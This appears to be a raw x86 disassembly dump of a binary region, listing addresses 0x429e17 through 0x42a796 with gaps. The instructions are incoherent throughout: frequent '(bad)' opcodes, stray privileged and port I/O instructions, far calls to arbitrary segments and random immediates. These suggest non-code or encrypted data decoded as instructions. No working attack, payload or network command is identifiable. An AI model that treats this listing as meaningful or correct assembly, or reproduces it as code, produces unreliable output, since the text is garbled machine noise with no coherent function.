  429e17:	fdivr  DWORD PTR ds:0x13454d62
  429e1d:	cmp    eax,0x8a2a2473
  429e22:	pop    esp
  429e23:	dec    eax
  429e24:	push   0x6b2c9ea
  429e29:	aaa    
  429e2a:	add    bh,BYTE PTR [edi-0x43d576e0]
  429e30:	sub    DWORD PTR [edx+0x7],edi
  429e33:	push   edi
  429e34:	or     BYTE PTR [ebx],ch
  429e36:	and    dl,cl
  429e38:	and    DWORD PTR [edi-0x5c],eax
  429e3b:	push   eax
  429e3c:	aaa    
  429e3d:	sub    BYTE PTR [ebx+0x35],dh
  429e40:	dec    edx
  429e41:	aad    0x59
  429e43:	test   al,0xbd
  429e45:	mov    ch,0xce
  429e47:	sbb    ebp,esp
  429e49:	jge    0x429e4b
  429e4b:	xchg   esi,eax
  429e4c:	push   0x19
  429e4e:	pop    esp
  429e4f:	or     DWORD PTR [ecx+0xaf1e5c5],ecx
  429e55:	pop    ebx
  429e56:	shl    BYTE PTR [ebx+0x6c669a10],0x61
  429e5d:	outs   dx,DWORD PTR ds:[esi]
  429e5e:	dec    esp
  429e5f:	xor    esi,0xb38e089f
  429e65:	jnp    0x429e6f
  429e67:	fsub   DWORD PTR [edi+ebx*4-0x8d44524]
  429e6e:	push   0x2d76b337
  429e73:	xor    eax,0x9a4aa37
  429e78:	rcl    dl,1
  429e7a:	outs   dx,BYTE PTR ds:[esi]
  429e7b:	xor    al,0x95
  429e7d:	shl    DWORD PTR [edi-0x57],1
  429e80:	icebp  
  429e81:	fdiv   DWORD PTR [ebx+edi*1-0x3d]
  429e85:	xchg   ebx,eax
  429e86:	scas   eax,DWORD PTR es:[edi]
  429e87:	inc    ecx
  429e88:	jae    0x429e0b
  429e8a:	mov    bh,0x61
  429e8c:	icebp  
  429e8d:	add    edi,ebx
  429e8f:	lods   eax,DWORD PTR ds:[esi]
  429e90:	(bad)  
  429e91:	cs push cs
  429e93:	cmp    al,0xf0
  429e95:	(bad)  
  429e96:	pop    esi
  429e97:	dec    ecx
  429e98:	cdq    
  429e99:	dec    edx
  429e9a:	nop
  429e9b:	js     0x429ef3
  429e9d:	pusha  
  429e9e:	xor    eax,0x77c119bd
  429ea3:	cld    
  429ea4:	dec    ebx
  429ea5:	(bad)
  429ea9:	inc    ebp
  429eaa:	into   
  429eab:	dec    ecx
  429eac:	push   ss
  429ead:	adc    eax,0xce71358b
  429eb2:	jge    0x429ef7
  429eb4:	xchg   esi,eax
	...
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0xeedd812d
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    bl,bl
  429f2f:	fcomp  DWORD PTR [ecx-0xe]
  429f32:	inc    ebp
  429f33:	mov    ah,0x74
  429f35:	(bad)  
  429f36:	jecxz  0x429ebc
  429f38:	mov    ecx,0xbd1a150d
  429f3d:	xchg   ecx,eax
  429f3e:	add    eax,DWORD PTR [edx]
  429f40:	ins    BYTE PTR es:[edi],dx
  429f41:	xor    eax,0xfdc6c702
  429f46:	test   al,0xd4
  429f48:	xchg   ebp,eax
  429f49:	jle    0x429f2d
  429f4b:	mov    eax,ds:0x9f5f5942
  429f50:	mov    bl,0x76
  429f52:	shl    DWORD PTR [edi+edi*2-0x6b0a205a],0x3f
  429f5a:	test   al,0xcd
  429f5c:	jbe    0x429fa5
  429f5e:	aam    0xb5
  429f60:	je     0x429fc4
  429f62:	mov    DWORD PTR [edi],ebp
  429f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f65:	xchg   esi,eax
  429f66:	aad    0x97
  429f68:	dec    edi
  429f69:	dec    esp
  429f6a:	push   ss
  429f6b:	inc    esp
  429f6c:	jno    0x429f99
  429f6e:	imul   ebx,DWORD PTR [ebp+0x52],0xd2996338
  429f75:	bound  ebp,QWORD PTR [ebp+ebp*2+0x1d]
  429f79:	jbe    0x429fbd
  429f7b:	or     edx,esp
  429f7d:	pop    esp
  429f7e:	cmp    esi,edx
  429f80:	jecxz  0x429f8b
  429f82:	test   esp,esi
  429f84:	push   ebx
  429f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f86:	test   al,0x7c
  429f88:	aam    0x8c
  429f8a:	jnp    0x429fc9
  429f8c:	ret    
  429f8d:	fdivr  DWORD PTR [eax]
  429f8f:	ja     0x429fd2
  429f91:	mov    edi,0x1321e060
  429f96:	jecxz  0x429f77
  429f98:	ins    DWORD PTR es:[edi],dx
  429f99:	mov    ecx,0x45d7f339
  429f9e:	retf   0x6ae3
  429fa1:	bound  esi,QWORD PTR [eax]
  429fa3:	jns    0x429f34
  429fa5:	test   DWORD PTR [esp+ebx*2+0x36],ecx
  429fa9:	aas    
  429faa:	or     DWORD PTR [ecx+0x75],ebx
  429fad:	mov    ds:0xfd41e13a,al
  429fb2:	outs   dx,BYTE PTR ds:[esi]
  429fb3:	pop    ebp
  429fb4:	and    al,0xac
  429fb6:	add    esi,edx
  429fb8:	addr16 add ah,bl
  429fbb:	shr    BYTE PTR [eax-0x75],0xe3
  429fbf:	and    edi,0xd5ec4813
  429fc5:	out    dx,al
  429fc6:	lock mov al,ds:0xf88a4a74
  429fcc:	push   eax
  429fcd:	mul    DWORD PTR [eax-0x80]
  429fd0:	aas    
  429fd1:	ffreep st(3)
  429fd3:	cmp    eax,0x7d
  429fd6:	xor    eax,0x3ec00942
  429fdb:	mov    esp,0x75d3ecd
  429fe0:	stos   BYTE PTR es:[edi],al
  429fe1:	(bad)  
  429fe2:	xchg   esp,eax
  429fe3:	inc    edi
  429fe4:	test   DWORD PTR [ebp+0x62],edx
  429fe7:	aas    
  429fe8:	mov    bl,0xd5
  429fea:	jae    0x42a02d
  429fec:	(bad)  
  429fed:	mov    ecx,0x7ffe5d69
  429ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ff3:	push   0xadc6f2fd
  429ff8:	test   DWORD PTR [ebp+0x3494bfe],eax
  429ffe:	mov    ecx,0x91e1fa9a
  42a003:	enter  0xdce5,0xd4
  42a007:	xchg   ebp,eax
  42a008:	shl    BYTE PTR [ebx],0x4a
  42a00b:	sbb    al,dl
  42a00d:	nop
  42a00e:	in     al,dx
  42a00f:	and    ch,BYTE PTR ds:0x814061e8
  42a015:	push   edi
  42a016:	cli    
  42a017:	cmp    al,0x57
  42a019:	call   0xb617:0xb02103cf
  42a020:	in     al,0xba
  42a022:	xchg   ebx,eax
  42a023:	aas    
  42a024:	jg     0x429fa9
  42a026:	jl     0x429fbc
  42a028:	fwait
  42a029:	push   es
  42a02a:	jno    0x42a036
  42a02c:	cdq    
  42a02d:	rol    DWORD PTR [ecx],1
  42a02f:	call   0x6dd377b5
  42a034:	jae    0x42a036
	...
  42a096:	xlat   BYTE PTR ds:[ebx]
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0x42904a4e
  42a0a5:	lock popa 
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [ebx+0x6a],dh
  42a0b0:	xor    BYTE PTR [edx+0x47fa419d],ah
  42a0b6:	cmc    
  42a0b7:	rcr    ch,0x37
  42a0ba:	cmp    al,0xfc
  42a0bc:	pop    esi
  42a0bd:	push   es
  42a0be:	cwde   
  42a0bf:	call   0x80a0:0x8912ba7f
  42a0c6:	imul   BYTE PTR [ecx+0x28]
  42a0c9:	in     al,dx
  42a0ca:	mov    eax,ds:0xbdb81560
  42a0cf:	imul   ecx,DWORD PTR [eax],0xffffff98
  42a0d2:	cmp    al,0xb9
  42a0d4:	pop    ss
  42a0d5:	in     al,dx
  42a0d6:	jecxz  0x42a126
  42a0d8:	mov    ah,0x95
  42a0da:	push   edx
  42a0db:	adc    bl,ch
  42a0dd:	mov    esi,DWORD PTR [ecx]
  42a0df:	nop
  42a0e0:	shl    bh,0x11
  42a0e3:	sbb    dh,BYTE PTR [ecx-0x1f628d6a]
  42a0e9:	cmp    al,bl
  42a0eb:	inc    DWORD PTR [ebx+0x1b]
  42a0ee:	(bad)  
  42a0ef:	cmc    
  42a0f0:	jmp    0x42a154
  42a0f2:	xor    ebp,ebx
  42a0f4:	sbb    esi,DWORD PTR [ebx-0x5b]
  42a0f7:	leave  
  42a0f8:	pop    ds
  42a0f9:	loope  0x42a10a
  42a0fb:	into   
  42a0fc:	jecxz  0x42a152
  42a0fe:	ins    DWORD PTR es:[edi],dx
  42a0ff:	add    eax,0x3cbd0781
  42a104:	jbe    0x42a0a1
  42a106:	adc    esi,edx
  42a108:	ins    BYTE PTR es:[edi],dx
  42a109:	push   esi
  42a10a:	retf   
  42a10b:	stc    
  42a10c:	or     BYTE PTR [eax],dh
  42a10e:	iret   
  42a10f:	loope  0x42a181
  42a111:	lods   al,BYTE PTR ds:[esi]
  42a112:	sar    DWORD PTR [edi+0x41],1
  42a115:	out    0x10,al
  42a117:	inc    esp
  42a118:	xor    al,0x6b
  42a11a:	outs   dx,BYTE PTR ds:[esi]
  42a11b:	sub    eax,0xe4ddc906
  42a120:	(bad)  
  42a121:	xlat   BYTE PTR ds:[ebx]
  42a122:	dec    ebx
  42a123:	mov    eax,0x173bb4be
  42a128:	inc    ebx
  42a129:	xchg   esp,eax
  42a12a:	mov    dh,0xd6
  42a12c:	(bad)  
  42a12d:	out    dx,al
  42a12e:	jae    0x42a18a
  42a130:	test   BYTE PTR [edx+edi*2-0x74],ch
  42a134:	das    
  42a135:	jmp    0x3ed3fea4
  42a13a:	ror    DWORD PTR [edi-0x445f788d],1
  42a140:	inc    ecx
  42a141:	sbb    DWORD PTR ds:0xb9a425f3,edx
  42a147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a148:	aad    0xcc
  42a14a:	popf   
  42a14b:	cs in  eax,dx
  42a14d:	and    ch,0x72
  42a150:	fidivr WORD PTR ds:0xcf081565
  42a156:	and    ah,BYTE PTR [ebx]
  42a158:	pop    edi
  42a159:	sub    BYTE PTR [esi+0x4a],0xd
  42a15d:	and    dl,al
  42a15f:	xor    ebp,DWORD PTR [ecx]
  42a161:	popf   
  42a162:	dec    ebx
  42a163:	inc    ecx
  42a164:	jnp    0x42a14f
  42a166:	(bad)  
  42a167:	in     eax,dx
  42a168:	nop
  42a169:	add    ebp,edx
  42a16b:	jl     0x42a1b9
  42a16d:	call   0x4c67:0x6fd7a057
  42a174:	pop    es
  42a175:	and    ebx,esp
  42a177:	pop    eax
  42a178:	cmc    
  42a179:	mov    DWORD PTR [ebx],esp
  42a17b:	fst    QWORD PTR [edx+0x5ed11651]
  42a181:	add    BYTE PTR [ebx],ah
  42a183:	pusha  
  42a184:	scas   al,BYTE PTR es:[edi]
  42a185:	into   
  42a186:	and    BYTE PTR [edx-0x36],ah
  42a189:	je     0x42a1c4
  42a18b:	scas   al,BYTE PTR es:[edi]
  42a18c:	aam    0x86
  42a18e:	lds    edx,FWORD PTR [ebx+0xba940b0]
  42a194:	xchg   BYTE PTR [edx+0x6b563575],ch
  42a19a:	mov    eax,0x730abdb4
  42a19f:	out    dx,eax
  42a1a0:	or     eax,ecx
  42a1a2:	ds pop ds
  42a1a4:	xor    ah,BYTE PTR [ebx-0x23bf417a]
  42a1aa:	(bad)  
  42a1ab:	fnstcw WORD PTR [ebp-0x5f751a23]
  42a1b1:	aad    0x1e
  42a1b3:	mov    WORD PTR [esi],ds
	...
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   edi,DWORD PTR [edi+0x68257375],0x70001c2
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    bl,bl
  42a22f:	adc    esi,edi
  42a231:	jne    0x42a1e4
  42a233:	stos   BYTE PTR es:[edi],al
  42a234:	dec    esi
  42a235:	jae    0x42a1fe
  42a237:	dec    DWORD PTR [ebx-0x46]
  42a23a:	xchg   edi,eax
  42a23b:	rcr    dh,0xdb
  42a23e:	jmp    FWORD PTR [edi+0x27]
  42a241:	mov    dh,0x12
  42a243:	sti    
  42a244:	ins    DWORD PTR es:[edi],dx
  42a245:	mov    eax,0xe03ec3e3
  42a24a:	ror    DWORD PTR [edx+eiz*8],0x17
  42a24e:	fwait
  42a24f:	hlt    
  42a250:	clc    
  42a251:	push   esi
  42a252:	hlt    
  42a253:	xchg   esi,eax
  42a254:	xor    BYTE PTR [eax-0x66],0x30
  42a258:	sbb    al,0xd
  42a25a:	add    DWORD PTR [ecx+0x59],esp
  42a25d:	sub    cl,dh
  42a25f:	popf   
  42a260:	jae    0x42a258
  42a262:	or     al,0x37
  42a264:	gs jg  0x42a2a9
  42a267:	fisubr WORD PTR [eax+0x423c2463]
  42a26d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a26e:	xor    BYTE PTR [eax-0x58],0x20
  42a272:	jle    0x42a20d
  42a274:	lods   al,BYTE PTR ds:[esi]
  42a275:	dec    ebp
  42a276:	jns    0x42a203
  42a278:	pusha  
  42a279:	jne    0x42a2f9
  42a27b:	in     al,0xed
  42a27d:	jl     0x42a28d
  42a27f:	addr16 mov al,ds:0xe813
  42a283:	lea    esi,[edx+0x5ad09abc]
  42a289:	test   DWORD PTR [edi-0x7e],0xa854675f
  42a290:	mov    eax,0x6b9af5ea
  42a295:	or     dl,BYTE PTR [ebp-0x3f78cbd7]
  42a29b:	mov    ebp,0x2578ba58
  42a2a0:	xchg   ebp,eax
  42a2a1:	arpl   WORD PTR [ebx],cx
  42a2a3:	lock gs jbe 0x42a231
  42a2a7:	or     eax,0x7d5d0478
  42a2ac:	mov    bl,0xec
  42a2ae:	sbb    BYTE PTR [edi-0x14],al
  42a2b1:	pushf  
  42a2b2:	hlt    
  42a2b3:	mov    dh,0x6e
  42a2b5:	push   ecx
  42a2b6:	jne    0x42a2ea
  42a2b8:	arpl   bx,di
  42a2ba:	jge    0x42a29b
  42a2bc:	ret    
  42a2bd:	cmp    ecx,DWORD PTR [ecx]
  42a2bf:	je     0x42a2a1
  42a2c1:	and    BYTE PTR [ebx-0x118c441d],al
  42a2c7:	aad    0x42
  42a2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a2ca:	jge    0x42a2a6
  42a2cc:	push   ss
  42a2cd:	loope  0x42a289
  42a2cf:	shl    BYTE PTR [edx+0x5e],1
  42a2d2:	pop    edx
  42a2d3:	loop   0x42a2b4
  42a2d5:	mov    ah,0xc
  42a2d7:	leave  
  42a2d8:	cmp    bh,BYTE PTR [ebx-0x277abaa]
  42a2de:	ss and al,0x60
  42a2e1:	mov    eax,0xfbd5da02
  42a2e6:	mov    WORD PTR [ecx+ecx*1+0x11],ds
  42a2ea:	jne    0x42a29b
  42a2ec:	lea    edx,[esi+esi*1+0x78d3ad4d]
  42a2f3:	adc    eax,0x7d6c1250
  42a2f8:	cmp    BYTE PTR [ebx-0x19],dl
  42a2fb:	mov    ah,bl
  42a2fd:	fcom   QWORD PTR [ebp+0x3f]
  42a300:	shl    BYTE PTR [eax-0x1bf7c1af],1
  42a306:	mov    al,0x2e
  42a308:	adc    eax,0xbc9e16fd
  42a30d:	cmp    BYTE PTR [eax+0x8],al
  42a310:	jle    0x42a33d
  42a312:	fnsave [ecx+0x458ffdb4]
  42a318:	adc    BYTE PTR [ebx+0x49],ch
  42a31b:	mov    edx,0xdb1dea9f
  42a320:	jl     0x42a344
  42a322:	xchg   edx,eax
  42a323:	loop   0x42a318
  42a325:	add    al,bl
  42a327:	into   
  42a328:	push   es
  42a329:	cmp    edi,DWORD PTR [eax+0x7c]
  42a32c:	retf   
  42a32d:	std    
  42a32e:	xchg   edx,ebx
  42a330:	sub    eax,0x606b05ef
	...
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0x1667
  42a3a4:	inc    edi
  42a3a5:	add    al,0x6f
  42a3a7:	ret    
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR ds:0x7e059203,cl
  42a3b3:	loopne 0x42a39d
  42a3b5:	bound  esi,QWORD PTR [eax]
  42a3b7:	push   ebx
  42a3b8:	cmp    BYTE PTR ds:0x8eb8e3a6,0x57
  42a3bf:	sub    BYTE PTR [ebp+0x4c5a1cc8],dh
  42a3c5:	xchg   ebp,eax
  42a3c6:	addr16 push 0x73
  42a3c9:	sbb    ebx,ebp
  42a3cb:	mov    dh,BYTE PTR [ecx-0x80]
  42a3ce:	pusha  
  42a3cf:	sysexit 
  42a3d1:	push   esp
  42a3d2:	push   ebp
  42a3d3:	and    al,0x1d
  42a3d5:	test   al,0x2c
  42a3d7:	stos   DWORD PTR es:[edi],eax
  42a3d8:	sbb    eax,0x59133e7c
  42a3dd:	pop    ss
  42a3de:	mov    edi,0xbeaf49ef
  42a3e3:	je     0x42a458
  42a3e5:	enter  0x6fdd,0xf7
  42a3e9:	and    eax,0x77bad78a
  42a3ee:	fisubr WORD PTR [esi-0x38]
  42a3f1:	jg     0x42a464
  42a3f3:	lock pop ss
  42a3f5:	int3   
  42a3f6:	in     eax,dx
  42a3f7:	mov    ebx,0xd39ac7a6
  42a3fc:	xchg   ebx,eax
  42a3fd:	repz jnp 0x42a41f
  42a400:	rol    DWORD PTR [esi+0x534681e8],1
  42a406:	add    BYTE PTR [esi],0x8c
  42a409:	in     al,dx
  42a40a:	enter  0xa90d,0xd1
  42a40e:	jae    0x42a3e2
  42a410:	push   edi
  42a411:	push   ebp
  42a412:	mov    al,0xdd
  42a414:	imul   ebx,DWORD PTR [edx],0xffffffb8
  42a417:	pop    eax
  42a418:	stos   BYTE PTR es:[edi],al
  42a419:	jae    0x42a428
  42a41b:	retf   0xd478
  42a41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a41f:	imul   edi,DWORD PTR [eax+0x47],0xffffffd3
  42a423:	out    0xaf,al
  42a425:	inc    edi
  42a426:	mov    BYTE PTR [ebp-0x590fe747],bl
  42a42c:	push   ecx
  42a42d:	sub    DWORD PTR ds:0x4ca6a215,0x28
  42a434:	shl    DWORD PTR [esi+ecx*4+0x3a],1
  42a438:	mov    eax,ds:0xd11f9953
  42a43d:	add    al,0xe1
  42a43f:	cmp    DWORD PTR [ecx],ebp
  42a441:	jmp    0x60af11aa
  42a446:	mov    ch,0x4e
  42a448:	dec    ebp
  42a449:	hlt    
  42a44a:	or     DWORD PTR [ebp+0x29],esi
  42a44d:	(bad)  
  42a44e:	jl     0x42a483
  42a450:	repnz stos BYTE PTR es:[edi],al
  42a452:	sub    eax,0x8390c5ca
  42a457:	dec    ecx
  42a458:	sub    al,ah
  42a45a:	mov    WORD PTR [ecx],ds
  42a45c:	xchg   bl,dh
  42a45e:	or     DWORD PTR [esi+0x17],0x4e
  42a462:	in     al,dx
  42a463:	adc    esp,esp
  42a465:	pop    ss
  42a466:	or     DWORD PTR [ebx+0x11],ebx
  42a469:	fsubr  DWORD PTR [esi-0x4c]
  42a46c:	add    eax,0x26989c3c
  42a471:	inc    ebx
  42a472:	cs sub dh,cl
  42a475:	popa   
  42a476:	jno    0x42a45f
  42a478:	and    BYTE PTR [ebx],dh
  42a47a:	cld    
  42a47b:	cmc    
  42a47c:	fs jnp 0x42a4f0
  42a47f:	jbe    0x42a4df
  42a481:	xor    ebx,DWORD PTR [edi-0x76]
  42a484:	push   ecx
  42a485:	mov    al,0xfa
  42a487:	loopne 0x42a4ef
  42a489:	jmp    0x42a413
  42a48b:	loop   0x42a4fc
  42a48d:	hlt    
  42a48e:	bound  esi,QWORD PTR [ecx]
  42a490:	pop    ecx
  42a491:	xor    esp,DWORD PTR [edx]
  42a493:	xlat   BYTE PTR ds:[ebx]
  42a494:	push   cs
  42a495:	pop    ebx
  42a496:	out    dx,al
  42a497:	(bad)  
  42a498:	jmp    FWORD PTR [ebp-0x6]
  42a49b:	jbe    0x42a50f
  42a49d:	loop   0x42a4a4
  42a49f:	dec    edi
  42a4a0:	cli    
  42a4a1:	bswap  eax
  42a4a3:	xchg   DWORD PTR [eax],eax
  42a4a5:	push   ecx
  42a4a6:	mov    BYTE PTR [ebx+ebp*4+0x1860058],cl
  42a4ad:	aad    0x85
  42a4af:	pop    esi
  42a4b0:	arpl   WORD PTR ds:0x149a87,bp
	...
  42a516:	sbb    BYTE PTR [edi+0x17],cl
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    al,BYTE PTR [eax-0x7e]
  42a524:	stos   BYTE PTR es:[edi],al
  42a525:	inc    edx
  42a526:	jbe    0x42a4ec
  42a528:	add    DWORD PTR [eax],eax
  42a52a:	pop    es
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [ecx],ch
  42a52f:	and    DWORD PTR [ecx+0x71985a29],ebp
  42a535:	lahf   
  42a536:	(bad)  
  42a537:	xlat   BYTE PTR ds:[ebx]
  42a538:	mov    dl,0xf0
  42a53a:	ins    BYTE PTR es:[edi],dx
  42a53b:	nop
  42a53c:	and    edx,esi
  42a53e:	push   ds
  42a53f:	add    bh,BYTE PTR [ebp+0x77eecd36]
  42a545:	sbb    al,0xd0
  42a547:	and    ebp,DWORD PTR ds:0xc2306266
  42a54d:	sbb    esi,DWORD PTR [edx]
  42a54f:	ret    0x25d5
  42a552:	(bad)  
  42a553:	cs add dl,dh
  42a556:	addr16 gs push edi
  42a559:	outs   dx,DWORD PTR ds:[esi]
  42a55a:	ds shr dl,cl
  42a55d:	(bad)  
  42a55e:	aad    0x4e
  42a560:	jmp    0x42a522
  42a562:	je     0x42a51b
  42a564:	mov    edi,0xcffa7269
  42a569:	je     0x42a559
  42a56b:	xchg   edx,eax
  42a56c:	pushf  
  42a56d:	sub    edx,ebp
  42a56f:	dec    edi
  42a570:	push   0x94e61bb0
  42a575:	or     al,0x2c
  42a577:	adc    al,0x3e
  42a579:	bound  eax,QWORD PTR ss:[edi+ebp*8+0x617ba0b2]
  42a581:	mov    eax,0xbb1f7ae0
  42a586:	ins    DWORD PTR es:[edi],dx
  42a587:	test   DWORD PTR [ecx],esp
  42a589:	sahf   
  42a58a:	jno    0x42a5e5
  42a58c:	test   BYTE PTR [edx+0x2e],bl
  42a58f:	fadd   DWORD PTR [ecx+0x6e]
  42a592:	aad    0x68
  42a594:	sub    al,0x3e
  42a596:	and    BYTE PTR [ebp-0x3a72e66d],dl
  42a59c:	mov    cl,0x43
  42a59e:	and    ecx,ecx
  42a5a0:	xor    eax,0x7053ebeb
  42a5a5:	idiv   BYTE PTR [ebp-0x22]
  42a5a8:	mov    es,WORD PTR [edi]
  42a5aa:	jo     0x42a5dd
  42a5ac:	punpcklbw mm6,mm3
  42a5af:	popf   
  42a5b0:	jge    0x42a5c1
  42a5b2:	sbb    DWORD PTR [edx-0x1c],eax
  42a5b5:	cli    
  42a5b6:	test   esi,ebp
  42a5b8:	in     eax,dx
  42a5b9:	cmp    ch,cl
  42a5bb:	shl    DWORD PTR [ebx-0x1c0584af],cl
  42a5c1:	(bad)  
  42a5c2:	aad    0x25
  42a5c4:	xor    DWORD PTR [esp+esi*4+0x34],esi
  42a5c8:	jp     0x42a639
  42a5ca:	mov    ch,0xbb
  42a5cc:	or     esp,edx
  42a5ce:	jns    0x42a596
  42a5d0:	lods   eax,DWORD PTR ds:[esi]
  42a5d1:	mov    DWORD PTR [esi-0x13],eax
  42a5d4:	and    dl,BYTE PTR [edi+0x78441287]
  42a5da:	rcr    dl,cl
  42a5dc:	xchg   esi,eax
  42a5dd:	mov    bh,0x3b
  42a5df:	add    al,BYTE PTR [ebp-0x3e]
  42a5e2:	fwait
  42a5e3:	push   cs
  42a5e4:	ret    
  42a5e5:	ret    
  42a5e6:	je     0x42a5a2
  42a5e8:	jns    0x42a5f2
  42a5ea:	adc    DWORD PTR [esi-0x4e],edx
  42a5ed:	scas   al,BYTE PTR es:[edi]
  42a5ee:	addr16 jp 0x42a646
  42a5f1:	ja     0x42a576
  42a5f3:	xor    al,0xe9
  42a5f5:	or     BYTE PTR [edi-0x57],ch
  42a5f8:	lea    edx,[edx+0x5ec4038e]
  42a5fe:	add    ebx,ecx
  42a600:	mov    eax,ds:0x80eac012
  42a605:	int3   
  42a606:	mov    eax,ds:0xc85678cc
  42a60b:	sub    DWORD PTR [edi+edx*4-0x343ab1d],ebx
  42a612:	aaa    
  42a613:	mov    esi,0x8dc3f218
  42a618:	mov    dh,0xf0
  42a61a:	call   0xd3b8:0x501bca6a
  42a621:	inc    ebx
  42a622:	push   ss
  42a623:	outs   dx,BYTE PTR ds:[esi]
  42a624:	and    DWORD PTR [ecx],edx
  42a626:	es and eax,0x8de3c857
  42a62c:	pop    ecx
  42a62d:	(bad)  
  42a62f:	push   esp
  42a630:	js     0x42a60a
  42a632:	sbb    eax,0xa6d3
	...
  42a693:	add    BYTE PTR [eax],al
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0xe467323b
  42a6a3:	jl     0x42a708
  42a6a5:	sar    DWORD PTR [ebp-0x3b],cl
  42a6a8:	add    DWORD PTR [eax],eax
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    BYTE PTR [eax+eax*4],ah
  42a6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a6b1:	popa   
  42a6b2:	sub    ecx,edi
  42a6b4:	not    DWORD PTR [edx+0x69cea1bf]
  42a6ba:	mov    ds:0x17a37e58,eax
  42a6bf:	ret    
  42a6c0:	sbb    al,0x54
  42a6c2:	mov    al,0xc2
  42a6c4:	or     eax,0x845579f2
  42a6c9:	(bad)  
  42a6cb:	es cwde 
  42a6cd:	ret    
  42a6ce:	inc    edx
  42a6cf:	adc    BYTE PTR [edi+0x6a],dl
  42a6d2:	xchg   ecx,eax
  42a6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6d4:	bound  edx,QWORD PTR [ebx]
  42a6d6:	repz jecxz 0x42a662
  42a6d9:	je     0x42a6e5
  42a6db:	push   eax
  42a6dc:	pop    es
  42a6dd:	fst    QWORD PTR [edi-0x28553549]
  42a6e3:	add    BYTE PTR [ecx+0x39140f75],bh
  42a6e9:	bound  ebp,QWORD PTR [esi+ecx*8-0x35]
  42a6ed:	fidivr DWORD PTR [eax+0xd]
  42a6f0:	out    dx,eax
  42a6f1:	call   0x65f8a168
  42a6f6:	mov    ebx,0xffd067d
  42a6fb:	ret    
  42a6fc:	fimul  DWORD PTR [edx-0x7b]
  42a6ff:	or     BYTE PTR [ebx-0x7],dl
  42a702:	sti    
  42a703:	fsub   DWORD PTR [ecx-0x1c]
  42a706:	jg     0x42a77d
  42a708:	cmp    edi,DWORD PTR [edx-0x5f]
  42a70b:	fdiv   DWORD PTR [ecx]
  42a70d:	out    0xda,eax
  42a70f:	stos   DWORD PTR es:[edi],eax
  42a710:	pushf  
  42a711:	dec    esp
  42a712:	aas    
  42a713:	mov    esi,0x8a09c787
  42a718:	xor    BYTE PTR [ecx+0x6c71dd94],ch
  42a71e:	jp     0x42a6c8
  42a720:	int3   
  42a721:	or     BYTE PTR [edx-0x20],bl
  42a724:	scas   al,BYTE PTR es:[edi]
  42a725:	not    BYTE PTR [esi-0x7d]
  42a728:	retf   
  42a729:	enter  0x5fba,0x95
  42a72d:	repz xlat BYTE PTR ds:[ebx]
  42a72f:	or     eax,0x80163a03
  42a734:	loope  0x42a738
  42a736:	in     ax,0xd7
  42a739:	mov    ebp,0xade0e8b
  42a73e:	std    
  42a73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a740:	or     ecx,DWORD PTR [esi+0x6038eb57]
  42a746:	popf   
  42a747:	shr    DWORD PTR [edx+esi*4],1
  42a74a:	xor    al,0xda
  42a74c:	test   eax,0x18044210
  42a751:	xlat   BYTE PTR ds:[ebx]
  42a752:	mov    cl,0x81
  42a754:	popa   
  42a755:	imul   edx,DWORD PTR [eax+0x27],0x56
  42a759:	(bad)  
  42a75a:	out    0x21,al
  42a75c:	adc    ecx,ecx
  42a75e:	in     al,0xf8
  42a760:	aas    
  42a761:	xor    cl,dh
  42a763:	mov    dh,0xd8
  42a765:	sub    eax,0xdfd6aefd
  42a76a:	in     al,dx
  42a76b:	scas   al,BYTE PTR es:[edi]
  42a76c:	test   dh,dl
  42a76e:	xor    BYTE PTR [edi-0x2],ch
  42a771:	int    0x4
  42a773:	(bad)  
  42a774:	imul   ecx,DWORD PTR [edx],0xffffff84
  42a777:	sub    eax,0x16d66a28
  42a77c:	scas   al,BYTE PTR es:[edi]
  42a77d:	sub    BYTE PTR [ecx],ch
  42a77f:	jns    0x42a7b4
  42a781:	inc    ebx
  42a782:	aaa    
  42a783:	push   0xffffff87
  42a785:	daa    
  42a786:	jne    0x42a7b3
  42a788:	adc    esi,DWORD PTR [esi+0x8e45aeb]
  42a78e:	and    edx,DWORD PTR [esi-0x2675346c]
  42a794:	or     DWORD PTR [ecx],ecx
  42a796:	in     eax,0x61
